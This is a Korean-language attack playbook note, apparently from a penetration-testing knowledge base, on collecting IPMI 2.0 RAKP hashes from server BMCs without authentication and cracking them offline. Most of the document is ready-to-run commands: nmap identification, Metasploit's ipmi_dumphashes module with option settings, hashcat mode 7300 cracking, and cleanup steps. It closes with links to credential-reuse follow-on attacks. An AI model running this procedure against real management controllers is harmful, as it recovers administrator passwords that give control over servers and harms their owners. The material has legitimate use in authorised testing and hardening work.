---
tags:
  - 환경/network-appliance
  - 서비스/ipmi
시작조건: ["명령 실행 위치에서 대상 BMC UDP/623 접근 가능", "IPMI 2.0 RMCP+ 응답 확인"]
필요권한: ["RAKP 응답 수집에는 사전 BMC 인증 불필요"]
필요조건: ["대상 BMC 주소", "BMC 사용자명 후보 또는 수집 도구의 사용자명 목록", "오프라인 크래킹 환경"]
결과: ["대상 BMC 계정의 RAKP HMAC challenge-response", "크래킹 성공 시 대상 BMC 계정의 평문 비밀번호"]
---

# IPMI hash 수집과 크래킹

## 한 줄 판단

명령 실행 위치에서 대상 Baseboard Management Controller(BMC)의 UDP/623에 접근할 수 있으면 IPMI 2.0 RMCP+의 RAKP HMAC challenge-response를 수집하고, 대상 BMC 계정의 평문 비밀번호를 오프라인으로 복구할 수 있는지 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 | 대상 BMC UDP/623에 접근하고 응답 수신 가능 | `nmap -sU --script ipmi-version`의 IPMI 응답 | 관리 VLAN, 라우팅, UDP 필터링과 대상 주소 확인 |
| 현재 인증 수단 | 사전 BMC credential 불필요 | 인증 없이 IPMI 2.0 RAKP 교환이 시작되는지 확인 | IPMI 버전과 익명 RAKP 응답 제한 여부 확인 |
| 공격 대상 계정 | 유효한 BMC 사용자명 후보 | 수집 출력의 사용자명과 RAKP HMAC 값 확인 | 기본 목록 또는 확인된 사용자 후보 재검토 |
| 오프라인 복구 환경 | RAKP 형식에 맞는 Hashcat mode와 wordlist | mode `7300` 입력 인식 | 캡처 형식과 전체 라인 확인 |

## 실행

`<TARGET>`은 UDP/623에 도달하는 BMC 주소(가상 예시 `192.0.2.44`)이고, `<IPMI_HASH_FILE>`·`<IPMI_POTFILE>`은 공격 호스트에서 새로 만드는 절대 경로다. `<IPMI_WORKSPACE>`는 Metasploit DB가 연결된 경우에만 쓰는 새 workspace 이름이며, `<ORIGINAL_MSF_WORKSPACE>`는 시작 전 `workspace` 출력에서 얻는다. 아래 수집·크래킹 명령은 공격 호스트에서 실행하고, 수집한 RAKP line은 BMC 로그인 성공으로 해석하지 않는다.

1. UDP 623과 IPMI 버전을 확인한다.
2. 이번 작업 전용 Hashcat 입력·potfile 경로와 Metasploit 저장 위치를 정한다.
3. Metasploit scanner로 IPMI RAKP HMAC-SHA1 수집 가능성을 확인한다.
4. Hashcat 입력 형식을 확인한 뒤 오프라인으로 비밀번호를 복구한다.
5. 복구한 credential은 BMC 웹/CLI 접근과 서버 제어 영향으로 분리해 판단한다.

### IPMI 식별

```bash
nmap -sU --script ipmi-version -p623 <TARGET>
```

확인할 출력:

- IPMI version, vendor, auth support.

### Metasploit hash 수집

공격 호스트에서 기존 파일과 Metasploit DB 상태를 먼저 확인한다. `<IPMI_HASH_FILE>`과 `<IPMI_POTFILE>`은 이번 작업에서 새로 만들 절대 경로로 정하고, 기존 파일이 있으면 덮어쓰지 않는다.

```bash
test ! -e '<IPMI_HASH_FILE>'
test ! -e '<IPMI_POTFILE>'
msfconsole
```

현재 upstream 모듈은 `OUTPUT_HASHCAT_FILE`과 기본값이 `true`인 `CRACK_COMMON`을 제공한다. 설치된 버전의 `show options`에 표시된 이름을 기준으로 하며, 과거 문서의 `OUTPUT_FILE`을 현재 옵션으로 가정하지 않는다. 수집과 별도 Hashcat 실행을 구분하기 위해 자동 common-password 대조는 끈다.

```text
db_status
workspace
```

DB가 연결되어 있고 `<IPMI_WORKSPACE>`가 기존 목록에 없을 때만 이번 작업 전용 workspace를 만든다. 실행 전에 현재 workspace 이름을 `<ORIGINAL_MSF_WORKSPACE>`로 기록한다.

```text
workspace -a <IPMI_WORKSPACE>
```

DB가 연결되지 않았다면 workspace 생성과 이후 삭제 단계는 생략하고 모듈만 실행한다.

```text
use auxiliary/scanner/ipmi/ipmi_dumphashes
show options
set RHOSTS <TARGET>
set CRACK_COMMON false
set OUTPUT_HASHCAT_FILE <IPMI_HASH_FILE>
run
```

`db_status`가 연결 상태이면 모듈이 hash와 취약점 정보를 현재 workspace에도 기록한다.

확인할 출력:

- `Hash found: <USER>:<SALT>:<HMAC>`와 `<IPMI_HASH_FILE>`의 새 행.
- 공격 호스트에서 `test -s '<IPMI_HASH_FILE>'`가 성공해 파일에 자료가 기록되었는지 확인한다.
- 현재 upstream의 Hashcat 파일은 `<TARGET> <USER>:<SALT>:<HMAC>`처럼 사용자 앞에 대상 정보가 붙으므로 Hashcat에서 `--username`으로 첫 필드를 분리한다.
- 수집 실패 메시지만으로 BMC 계정이 없다고 판단하지 않는다. 응답 가능한 사용자명 후보, IPMI 2.0 지원과 UDP 경로를 먼저 분리한다.
- `CRACK_COMMON false`에서는 모듈이 평문을 자동 복구하지 않는다. `Hash found`는 로그인 성공이나 평문 확보가 아니다.

### hashcat 크래킹

```bash
hashcat -m 7300 -a 0 '<IPMI_HASH_FILE>' '<WORDLIST>' --username --potfile-path '<IPMI_POTFILE>' --backend-ignore-opencl -d 1 -O -w 3
hashcat --show -m 7300 '<IPMI_HASH_FILE>' --username --potfile-path '<IPMI_POTFILE>' --backend-ignore-opencl -d 1 -O -w 3
```

확인할 출력:

- mode `7300`의 `IPMI2 RAKP HMAC-SHA1` 입력 인식과 `hash:password` 형태의 복구 결과.
- 현재 Metasploit 모듈은 HMAC-SHA1을 수집한다. 다른 도구가 HMAC-MD5라고 식별한 자료에는 mode `7300`을 적용하지 않고 Hashcat이 제공하는 해당 형식을 다시 확인한다.

## 변경 영향과 복구

이 절차는 BMC 설정을 바꾸지 않지만 공격 호스트에 hash·potfile과 선택적으로 Metasploit workspace 기록을 만든다.

1. Hashcat이 실행 중이면 해당 terminal에서 정상 중단하고, 이번 명령의 PID가 종료됐는지 확인한다.
2. Metasploit DB에 고유한 `<IPMI_WORKSPACE>`를 만들었다면 먼저 `workspace <ORIGINAL_MSF_WORKSPACE>`로 돌아간 뒤 `workspace -d <IPMI_WORKSPACE>`를 실행한다. `workspace` 목록에서 원래 workspace가 선택되고 작업 workspace가 사라졌는지 확인한다. 기존 workspace를 삭제하지 않는다.
3. 분석이 끝나고 보존이 필요하지 않다면 공격 호스트에서 이번 작업이 만든 exact 경로만 제거한다.

```text
workspace <ORIGINAL_MSF_WORKSPACE>
workspace -d <IPMI_WORKSPACE>
workspace
exit
```

```bash
rm -f -- '<IPMI_HASH_FILE>' '<IPMI_POTFILE>'
test ! -e '<IPMI_HASH_FILE>'
test ! -e '<IPMI_POTFILE>'
```

파일이 작업 전부터 있었거나 경로의 소유 관계가 불명확하면 삭제하지 않는다. RAKP 요청과 BMC·네트워크 로그는 되돌릴 수 없으므로 로컬 파일·workspace 정리와 원격 흔적 소멸을 같은 완료 상태로 표현하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| IPMI 버전과 BMC 응답 | 관리 인터페이스 식별 성공 | IPMI 접근 경로 확인 | RAKP hash 수집 가능성 확인 |
| 사용자명과 IPMI hash 출력 | 원격 hash 수집 성공 | 오프라인 크래킹 가능한 BMC hash 확보 | [[오프라인 해시 크래킹]] |
| Hashcat의 `hash:password` | BMC 비밀번호 복구 | 관리 credential 후보 | BMC 웹/CLI에서 인증과 기능 권한을 분리 검증 |
| UDP 응답 불안정 | 필터링, 손실 또는 네트워크 위치 문제 | 서비스 식별 불확실 | 재시도, rate와 네트워크 경로 확인 |
| hash 수집 실패 | IPMI 2.0 미지원 또는 설정 제한 | IPMI 서비스만 확인 | 기본 credential 여부와 웹 관리 포트 별도 확인 |
| 크래킹 실패 | 강한 비밀번호 또는 후보 부족 | IPMI hash만 확보 | 맞춤 wordlist 여부를 검토하고 우선순위 재평가 |

## 확인할 출력과 권한

- IPMI 버전 응답, hash 수집, 비밀번호 복구, 관리 콘솔 로그인은 각각 별도 상태다.
- hash 수집에는 사전 인증이 필요하지 않을 수 있지만 관리 기능은 복구한 계정의 BMC 역할에 제한된다.
- BMC 접근은 호스트 운영체제의 root 또는 도메인 권한과 동일하지 않다.
- 수집값은 BMC의 RAKP HMAC challenge-response이며 운영체제 계정의 NTLM hash나 Linux password hash가 아니다.

## 후속 공격 연결

- 크래킹: [[오프라인 해시 크래킹]]
- BMC credential 재사용: [[원격 비밀번호 공격]]

## 관련 상태 라우터

- BMC 비밀번호를 복구했으면: [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 서비스

- [[IPMI 서비스]]

## 관련 도구

- [[metasploit]]
- [[hashcat]]
- [[nmap]]

## 참고 링크

- [Nmap ipmi-version NSE](https://nmap.org/nsedoc/scripts/ipmi-version.html)
- [Metasploit ipmi_dumphashes 구현](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb)
- [Rapid7 IPMI 2.0 RAKP module](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
- [Rapid7 Metasploit workspace 관리](https://docs.rapid7.com/metasploit/managing-workspaces/)
- [Dan Farmer: Cracking IPMI Passwords Remotely](https://fish2.com/ipmi/remote-pw-cracking.html)
- [Hashcat help and example hashes](https://github.com/hashcat/hashcat/tree/master/docs)
